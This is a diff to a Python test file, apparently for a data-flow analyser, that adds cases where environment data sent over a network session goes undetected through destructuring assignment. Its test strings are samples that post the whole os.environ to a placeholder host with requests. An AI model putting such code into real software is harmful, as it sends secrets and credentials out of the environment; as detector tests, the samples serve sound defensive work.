@@ -1469,6 +1469,11 @@ def test_python_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
         "import os\nimport requests\n\nsession = requests.Session()\nout = {}\nout[session.post(host, json=dict(os.environ))] = 1\n",
         # Annotation evaluation varies by scope, future flags, and Python version, so it is skipped.
         "import os\nimport requests\n\nsession = requests.Session()\ndef annotated(value: session.post(host, json=dict(os.environ))):\n    pass\n",
+        # Sinks reached through a name bound by a destructuring target (issue #4296, case 6): the
+        # simple-name model reads the target's elements for bindings to drop but never records the
+        # values they bind, so the handle the first element really receives is not carried forward.
+        "import os\nimport requests\n\ns, other = requests.Session(), config\ns.post(host, json=dict(os.environ))\n",
+        "import os\nimport requests\n\n[s, other] = [requests.Session(), config]\ns.post(host, json=dict(os.environ))\n",
     ],
 )
 def test_python_declared_false_negatives_stay_unreported(tmp_path: Path, source: str) -> None:
